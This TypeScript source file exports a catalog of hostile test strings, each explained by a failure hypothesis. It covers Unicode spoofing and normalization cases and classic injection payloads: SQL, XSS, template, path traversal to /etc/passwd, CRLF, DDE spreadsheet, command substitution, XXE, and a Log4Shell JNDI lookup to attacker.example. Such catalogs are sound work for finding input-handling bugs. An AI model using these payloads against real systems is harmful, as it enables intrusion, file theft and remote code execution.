import type { CatalogEntry } from './types.js'

/**
 * The curated catalog of hostile string inputs - the part of adversary that
 * encodes testing craft a generic generator or a random fuzzer does not ship.
 *
 * Every entry is explainable: a human can read `failureHypothesis` and decide
 * whether the case is worth keeping. Values are written with explicit `\u`
 * escapes and the source is kept ASCII-only on purpose - the exact code points
 * are the whole point, so we never rely on file encoding or editor normalization.
 */
export const catalog: CatalogEntry[] = [
  // -- Internationalization / Unicode -------------------------------------------------
  {
    value: 'café', // "cafe" + U+0301 combining acute = "cafe" in NFD form
    technique: 'i18n',
    family: 'unicode-normalization',
    failureHypothesis:
      'NFD form of "cafe" (e + combining acute). Looks identical to the NFC form but has a different length and byte sequence. Equality checks, uniqueness constraints, and index lookups fail unless input is normalized to a single form first.',
  },
  {
    value: '\u{1F468}‍\u{1F469}‍\u{1F467}‍\u{1F466}', // family emoji (ZWJ sequence)
    technique: 'i18n',
    family: 'grapheme-vs-codeunit',
    failureHypothesis:
      'A single family emoji built from a ZWJ sequence. One grapheme to the user, but String length is 11 UTF-16 code units. Length limits, truncation, and character counts disagree with what the user sees.',
  },
  {
    value: 'à́̂̃̄̅̆̇̈̉̊', // base + stacked combining marks
    technique: 'i18n',
    family: 'combining-marks',
    failureHypothesis:
      'A base letter followed by many stacked combining marks ("Zalgo"). Length far exceeds visible characters, which can overflow fixed-width fields, break layout, and trigger catastrophic backtracking in unbounded regexes.',
  },
  {
    value: 'ADMİN', // U+0130 = LATIN CAPITAL LETTER I WITH DOT ABOVE
    technique: 'i18n',
    family: 'locale-case-mapping',
    failureHypothesis:
      'Contains U+0130 (dotted capital I). Case conversion is locale-dependent - .toLowerCase() differs between the default locale and tr-TR - so case-insensitive comparisons against "admin" behave differently by environment and can wrongly match or wrongly reject.',
  },
  {
    value: 'report‮fdp.exe', // U+202E right-to-left override
    technique: 'i18n',
    family: 'bidi-override',
    failureHypothesis:
      'Embeds U+202E (right-to-left override), which visually reverses the following text so a stored "report<RLO>fdp.exe" renders as "reportexe.pdf". Spoofs filenames and labels in any UI that does not strip bidi controls.',
  },
  {
    value: 'аdmin', // U+0430 = Cyrillic small a, looks like ASCII "a"
    technique: 'i18n',
    family: 'homoglyph',
    failureHypothesis:
      'Leads with Cyrillic "a" (U+0430), which looks identical to ASCII "a". Reads as "admin" to a human but is a different string - bypasses denylists and enables username / domain lookalike spoofing.',
  },
  {
    value: 'ａｄｍｉｎ', // fullwidth "admin"
    technique: 'i18n',
    family: 'fullwidth-forms',
    failureHypothesis:
      'Fullwidth Latin letters that read as "admin" but are distinct code points. Bypasses keyword, profanity, and reserved-name filters that only match ASCII.',
  },
  {
    value: 'ad​min', // U+200B zero-width space between "ad" and "min"
    technique: 'i18n',
    family: 'invisible-whitespace',
    failureHypothesis:
      'Contains a zero-width space (U+200B). Invisible in the UI but changes the string, so it defeats equality and uniqueness checks, splits words for filters, and hides in stored data.',
  },
  {
    value: ' admin ', // U+00A0 non-breaking spaces around the value
    technique: 'i18n',
    family: 'non-breaking-space',
    failureHypothesis:
      'Wrapped in non-breaking spaces (U+00A0) that look like ordinary spaces but are a distinct code point. Trimming diverges across layers - JavaScript trim() strips U+00A0, but Postgres trim() and Java String.trim() do not - so the same value is trimmed in one tier and left padded in another, causing mismatched equality and duplicate records.',
  },
  {
    value: '\u{1D407}\u{1D41E}\u{1D425}\u{1D425}\u{1D428}', // mathematical-bold "Hello" (astral plane)
    technique: 'i18n',
    family: 'astral-plane',
    failureHypothesis:
      'Mathematical-bold "Hello" - every character lives outside the Basic Multilingual Plane (4-byte UTF-8). MySQL\'s 3-byte "utf8" charset silently corrupts or rejects them, and code-unit substring/regex operations split the surrogate pairs.',
  },
  {
    value: 'مرحبا', // Arabic "marhaba" (RTL)
    technique: 'i18n',
    family: 'rtl-text',
    failureHypothesis:
      'Right-to-left Arabic script. Exposes bidi layout, cursor, and truncation bugs, and mixed-direction concatenation that reorders unexpectedly when combined with Latin text and digits.',
  },
  {
    value: 'straße', // German "strasse" written with U+00DF eszett
    technique: 'i18n',
    family: 'case-mapping-expansion',
    failureHypothesis:
      'The German eszett. "ß".toUpperCase() is "SS", so uppercasing lengthens the string ("straße" becomes "STRASSE") and is not reversible. A case-insensitive comparison that uppercases both sides can match, but a length check on the uppercased value sees a different count, and an upper-then-lower round trip loses the original character.',
  },
  {
    value: 'ﬁle', // "file" with the U+FB01 "fi" ligature as its first code point
    technique: 'i18n',
    family: 'compatibility-normalization',
    failureHypothesis:
      'The "fi" ligature (U+FB01), a single code point. Under NFKC - which many identifier, search, and username pipelines apply - it decomposes to the two ASCII letters "fi", so the string silently changes length and content: it does not equal "file" before normalization but does after, so equality and uniqueness depend on whether and where NFKC ran.',
  },
  {
    value: 'ad\u00ADmin', // U+00AD soft hyphen between "ad" and "min"
    technique: 'i18n',
    family: 'soft-hyphen',
    failureHypothesis:
      'A soft hyphen (U+00AD) inside the word. It is invisible in most rendering but is a real code point, so it defeats equality and uniqueness checks, splits the word for a denylist or search index, and survives in stored data while still reading as "admin".',
  },
  {
    value: '\uFEFFadmin', // leading U+FEFF byte order mark
    technique: 'i18n',
    family: 'byte-order-mark',
    failureHypothesis:
      'A leading byte order mark (U+FEFF). It is zero-width, so the value looks like "admin" but is a distinct, longer string, and a BOM that reaches a parser is often mishandled - JSON.parse of a BOM-prefixed document throws in Node - so a value copied out of a BOM-prefixed file carries an invisible first character into equality and key comparisons.',
  },
  {
    value: 'line1\u2028line2', // U+2028 line separator
    technique: 'i18n',
    family: 'line-separator',
    failureHypothesis:
      'A Unicode line separator (U+2028). JavaScript and several parsers treat U+2028 and U+2029 as line terminators, so a value that looks like a single line splits across lines when embedded in source or written to a log, and older JSON-embedded-in-JS pipelines break on it outright.',
  },
  {
    value: 'user\uD800', // lone high surrogate U+D800 with no low surrogate
    technique: 'i18n',
    family: 'lone-surrogate',
    failureHypothesis:
      'A lone high surrogate (U+D800) with no low surrogate to pair with - not well-formed Unicode text. encodeURIComponent throws a URIError on it, TextEncoder replaces it with the U+FFFD replacement character, and some databases reject or mangle it, so a value that survives in a JS string can fail the moment it is URL-encoded, UTF-8 encoded, or stored.',
  },

  // -- Injection ----------------------------------------------------------------------
  {
    value: "' OR '1'='1' --",
    technique: 'injection',
    family: 'sql-injection',
    failureHypothesis:
      'Classic SQL tautology with a comment terminator. If the value reaches a query built by string concatenation, it can make a WHERE clause always-true and bypass authentication or filters.',
  },
  {
    value: "Robert'); DROP TABLE students; --",
    technique: 'injection',
    family: 'sql-injection',
    failureHypothesis:
      'A statement-terminating payload ("little Bobby Tables"). Against an unparameterized query it can execute a second, destructive statement.',
  },
  {
    value: '<script>alert(1)</script>',
    technique: 'injection',
    family: 'xss',
    failureHypothesis:
      "A script tag. If the value is later rendered into HTML without escaping, it executes in the viewer's browser (stored XSS).",
  },
  {
    value: '"><img src=x onerror=alert(1)>',
    technique: 'injection',
    family: 'xss',
    failureHypothesis:
      'Breaks out of an HTML attribute and fires an inline event handler. Catches contexts where a value is interpolated inside an attribute rather than element text.',
  },
  {
    value: '${7*7}',
    technique: 'injection',
    family: 'template-injection',
    failureHypothesis:
      'Template / expression syntax. If the value is interpolated into a server-side template that evaluates expressions, it can leak data or run code (SSTI). A response containing "49" confirms evaluation.',
  },
  {
    value: '../../../../etc/passwd',
    technique: 'injection',
    family: 'path-traversal',
    failureHypothesis:
      'Relative path escape. If the value is used to build a filesystem path (upload name, template lookup, static file), it can read or write outside the intended directory.',
  },
  {
    value: 'value\r\nSet-Cookie: admin=true',
    technique: 'injection',
    family: 'crlf-injection',
    failureHypothesis:
      'Embedded CR/LF. Forges extra lines in logs (log forging) and, if reflected into HTTP headers, splits the response to inject headers or content.',
  },
  {
    value: 'safe.jpg .exe', // U+0000 NUL byte
    technique: 'injection',
    family: 'null-byte',
    failureHypothesis:
      'Embedded NUL byte. Truncates the string in C-backed layers (filesystem, some native DB drivers) so an extension or content check that sees "safe.jpg" is defeated while the real path ends in ".exe".',
  },
  {
    value: '%s%s%s%s%n',
    technique: 'injection',
    family: 'format-string',
    failureHypothesis:
      'printf-style format tokens. In any layer that passes user input as a format string (some logging paths and native bindings), this can crash the process or leak memory.',
  },
  {
    value: "=cmd|'/c calc'!A1",
    technique: 'injection',
    family: 'csv-injection',
    failureHypothesis:
      'A spreadsheet formula. If the value is exported to CSV or XLSX and opened in Excel, Google Sheets, or LibreOffice, a leading =, +, -, or @ is evaluated as a formula rather than shown as text, which can exfiltrate other cells or run a command via DDE.',
  },
  {
    value: '${jndi:ldap://attacker.example/a}',
    technique: 'injection',
    family: 'jndi-injection',
    failureHypothesis:
      'A JNDI lookup expression, the Log4Shell shape (CVE-2021-44228). If the value is logged by a Java logging pipeline that performs message lookups, the ${jndi:...} is resolved and can load a remote class, turning a logged string into remote code execution.',
  },
  {
    value: '$(id)',
    technique: 'injection',
    family: 'command-injection',
    failureHypothesis:
      'Shell command substitution. If the value is interpolated into a shell command line (a spawned shell, backticks, os.system), $(id) runs as a separate command and its output is substituted, so an unsanitized value executes code on the host.',
  },
  {
    value: '*)(uid=*))(|(uid=*',
    technique: 'injection',
    family: 'ldap-injection',
    failureHypothesis:
      'An LDAP filter escape. If the value is concatenated into an LDAP search filter unescaped, the added parentheses and wildcards rewrite the filter so it matches every entry, bypassing an authentication or lookup filter.',
  },
  {
    value: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    technique: 'injection',
    family: 'xxe-injection',
    failureHypothesis:
      'An XML external entity declaration. If the value is parsed as XML by a parser with external entities enabled, the entity is expanded from file:///etc/passwd, disclosing local files (XXE), and a parameter-entity variant can reach internal network services.',
  },
]
